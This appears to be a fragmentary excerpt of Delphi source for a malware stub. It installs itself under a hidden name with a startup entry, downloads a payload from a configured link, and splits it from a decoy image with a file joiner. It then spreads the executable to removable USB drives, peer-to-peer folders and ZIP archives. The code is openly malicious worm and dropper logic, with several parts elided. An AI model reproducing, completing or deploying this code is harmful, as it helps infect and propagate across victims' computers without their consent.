...
uses
  System.SysUtils, Windows, DH_Builder_Tools, DH_Installer, DH_Malware_Disables,
  DH_USB_Spread,
  DH_P2P_Spread, DH_ZIP_Spread, DH_File_Joiner, URLMon;
...
var
  link, new_name, malware_size, image_size, op_usb_spread, op_p2p_spread,
    op_zip_spread, folder_zip_spread: string;

var
  malware_old_name, image_new_name: string;
...
begin
  try
    ...
    begin
      ...
      op_usb_spread := regex(contenido, '[op_usb_spread]', '[op_usb_spread]');
      op_p2p_spread := regex(contenido, '[op_p2p_spread]', '[op_p2p_spread]');
      op_zip_spread := regex(contenido, '[op_zip_spread]', '[op_zip_spread]');
      folder_zip_spread := regex(contenido, '[folder_zip_spread]',
        '[folder_zip_spread]');
      ...
      begin
        ...
        installer.setMoveFile(op_use_special_path, op_use_this_path,
          special_path, path, folder, 'wdh.exe');
        installer.setHide(op_hide_files);
        installer.setStartup(op_use_startup, 'wdh');
        ...
        malware_old_name := 'iamimage.jpg';
        image_new_name := 'image.jpg';

        if not(link = '') and not(new_name = '') and not(malware_size = '') and
          not(image_size = '') then
        begin
          DeleteFile(Pchar(malware_old_name));
          if (download_file(link, malware_old_name)) then
          begin
            DeleteFile(Pchar(image_new_name));
            DeleteFile(Pchar(new_name));
            if (joiner.split_files(malware_old_name, [image_new_name, new_name],
            ...
            begin
              ...
              fullpath := GetCurrentDir + '\' + new_name;
                ...
                begin
                  ...
                  begin
                    if (check_drive(Pchar(unidad + ':\')) = True) and
                      (GetDriveType(Pchar(unidad + ':\')) = DRIVE_REMOVABLE)
                    then
                    begin
                      usb.USB_Spread(unidad + ':\', fullpath, new_name, True);
                    end;
                  end;
                end;

                if (op_p2p_spread = '1') then
                begin
                  p2p.P2P_Spread(fullpath);
                end;

                if (op_zip_spread = '1') then
                begin
                  zip.ZIP_Spread(folder_zip_spread, fullpath);
                end;
